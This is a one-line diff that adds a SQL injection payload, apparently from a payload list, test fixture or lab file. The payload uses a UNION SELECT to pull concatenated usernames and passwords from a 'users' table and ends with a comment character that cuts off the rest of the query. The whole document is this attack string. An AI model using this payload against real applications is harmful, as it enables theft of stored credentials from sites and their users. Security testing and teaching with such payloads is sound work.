@@ -1,0 +1,1 @@
+' union all select concat(username,':',password),1 from fancydb.users#
